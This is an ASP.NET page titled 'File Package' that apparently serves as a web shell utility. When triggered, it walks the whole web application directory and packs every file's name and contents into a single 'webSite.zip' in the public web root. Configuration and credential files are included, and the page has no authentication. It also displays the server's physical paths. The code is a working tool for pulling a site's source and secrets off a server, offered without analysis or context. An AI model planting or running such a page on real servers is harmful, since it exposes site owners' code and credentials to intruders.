<%@ Page Language="C#" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections.Generic" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">

    public String ShowMsg = String.Empty;
    public static FileStream fs = null;
    List<String> ContainSuffix = new List<string>();
    List<String> NoContainSuffix = new List<string>();
    Int32 FileSize = 0;
    protected void Page_Load(object sender, EventArgs e)
    {

        if (!IsPostBack)
        {
        }
        if (fs == null)
        {
            ShowMsg = "No Run Or Done";
        }
    }

    protected void btnRun_Click(object sender, EventArgs e)
    {
        if (fs == null)
        {
            if (!String.IsNullOrEmpty(txtFileSize.Text.Trim()) && Regex.IsMatch(txtFileSize.Text.Trim(), @"^\d+$"))
            {
                FileSize = Convert.ToInt32(txtFileSize.Text.Trim());
            }
            if (!String.IsNullOrEmpty(txtContainSuffix.Text.Trim()))
            {
                String[] arr = txtContainSuffix.Text.Trim().Split('|');
                foreach (String item in arr)
                {
                    if (!String.IsNullOrEmpty(item))
                    {
                        if (!ContainSuffix.Contains(item))
                        {
                            ContainSuffix.Add(item.ToLower());
                        }
                    }
                }
            }
            if (!String.IsNullOrEmpty(txtNoContainSuffix.Text.Trim()))
            {
                String[] arr = txtNoContainSuffix.Text.Trim().Split('|');
                foreach (String item in arr)
                {
                    if (!String.IsNullOrEmpty(item))
                    {
                        if (!NoContainSuffix.Contains(item))
                        {
                            NoContainSuffix.Add(item.ToLower());
                        }
                    }
                }
            }
            fs = new FileStream(Server.MapPath("~") + "webSite.zip", FileMode.CreateNew);
            SaveFile(AppDomain.CurrentDomain.BaseDirectory);
            fs.Close();
            fs.Dispose();
            Response.Write("Done");
        }
    }


    /// <summary>  
    ///  
    /// </summary>  
    /// <param name="m"></param>  
    /// <param name="arry"></param>  
    /// <returns></returns>  
    bool ConvertIntToByteArray(Int32 m, ref byte[] arry)
    {
        if (arry == null) return false;
        if (arry.Length < 4) return false;

        arry[0] = (byte)(m & 0xFF);
        arry[1] = (byte)((m & 0xFF00) >> 8);
        arry[2] = (byte)((m & 0xFF0000) >> 16);
        arry[3] = (byte)((m >> 24) & 0xFF);

        return true;
    }
    public void SaveFile(String path)
    {
        try
        {
            String[] dirs = Directory.GetDirectories(path);
            foreach (String dir in dirs)
            {
                SaveFile(dir);
            }
        }
        catch { }
        try
        {
            String[] files = Directory.GetFiles(path);
            foreach (String filePath in files)
            {
                try
                {
                    FileInfo file = new FileInfo(filePath);
                    if (!ContainSuffix.Count.Equals(0))
                    {
                        if (!String.IsNullOrEmpty(file.Extension) && !ContainSuffix.Contains(file.Extension.ToLower()))
                        {
                            continue;
                        }
                    }
                    if (!NoContainSuffix.Count.Equals(0))
                    {
                        if (!String.IsNullOrEmpty(file.Extension) && NoContainSuffix.Contains(file.Extension.ToLower()))
                        {
                            continue;
                        }
                    }
                    if (!FileSize.Equals(0) && file.Length > FileSize)
                    {
                        continue;
                    }
                    byte[] byteFileName = Encoding.UTF8.GetBytes(filePath.Replace(AppDomain.CurrentDomain.BaseDirectory, ""));
                    using (FileStream tempFs = file.OpenRead())
                    {
                        byte[] byteFileContent = new byte[tempFs.Length];
                        tempFs.Read(byteFileContent, 0, byteFileContent.Length);
                        using (MemoryStream ms = new MemoryStream())
                        {

                            byte[] buf = new byte[4];
                            ConvertIntToByteArray(byteFileName.Length, ref buf);
                            ms.Write(buf, 0, buf.Length);
                            ms.Write(byteFileName, 0, byteFileName.Length);
                            ConvertIntToByteArray(byteFileContent.Length, ref buf);
                            ms.Write(buf, 0, buf.Length);
                            ms.Write(byteFileContent, 0, byteFileContent.Length);
                            byte[] buffer = ms.ToArray();
                            fs.Write(buffer, 0, buffer.Length);
                            fs.Flush();
                        }
                    }


                }
                catch { }
            }
        }
        catch { }
    }

    protected void btnStop_Click(object sender, EventArgs e)
    {
        if (fs != null)
        {
            try
            {
                fs.Close();
                fs.Dispose();
                fs = null;
            }
            catch { }
        }
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <title>File Package</title>
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    <style type="text/css">
        body
        {
            background-color: #ffffff;
            color: #000000;
        }
        body, td, th, h1, h2
        {
            font-family: sans-serif;
        }
        pre
        {
            margin: 0px;
            font-family: monospace;
        }
        a:link
        {
            color: #000099;
            text-decoration: none;
            background-color: #ffffff;
        }
        a:hover
        {
            text-decoration: underline;
        }
        table
        {
            border-collapse: collapse;
        }
        .center
        {
            text-align: center;
        }
        .center table
        {
            margin-left: auto;
            margin-right: auto;
            text-align: left;
        }
        .center th
        {
            text-align: center !important;
        }
        td, th
        {
            border: 1px solid #000000;
            font-size: 75%;
            vertical-align: baseline;
        }
        h1
        {
            font-size: 150%;
        }
        h2
        {
            font-size: 125%;
        }
        .p
        {
            text-align: left;
        }
        .e
        {
            background-color: #ccccff;
            font-weight: bold;
            color: #000000;
        }
        .h
        {
            background-color: #9999cc;
            font-weight: bold;
            color: #000000;
        }
        .v
        {
            background-color: #cccccc;
            color: #000000;
        }
        .vr
        {
            background-color: #cccccc;
            text-align: right;
            color: #000000;
        }
        img
        {
            float: right;
            border: 0px;
        }
        hr
        {
            width: 600px;
            background-color: #cccccc;
            border: 0px;
            height: 1px;
            color: #000000;
        }
        input
        {
            width: 100%;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
    <div class="center">
        <table border="0" cellpadding="0" cellspacing="0" width="600">
            <tbody>
                <tr>
                    <td class="e">
                        Path
                    </td>
                    <td class="v">
                        <%=AppDomain.CurrentDomain.BaseDirectory %>
                    </td>
                </tr>
                <tr>
                    <td class="e">
                        Ex(|)
                    </td>
                    <td class="v">
                        <asp:TextBox ID="txtContainSuffix" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td class="e">
                        unEx(|)
                    </td>
                    <td class="v">
                        <asp:TextBox ID="txtNoContainSuffix" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td class="e">
                        SavePath
                    </td>
                    <td class="v">
                        <%=Server.MapPath("~") %>
                    </td>
                </tr>
                <tr>
                    <td class="e">
                        MaxSize:
                    </td>
                    <td class="v">
                        <asp:TextBox ID="txtFileSize" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td>
                    </td>
                    <td>
                        <asp:Button ID="btnRun" runat="server" Text="Run" OnClick="btnRun_Click" /><br />
                        <asp:Button ID="btnStop" runat="server" Text="Stop" OnClick="btnStop_Click" />
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    </form>
</body>
</html>

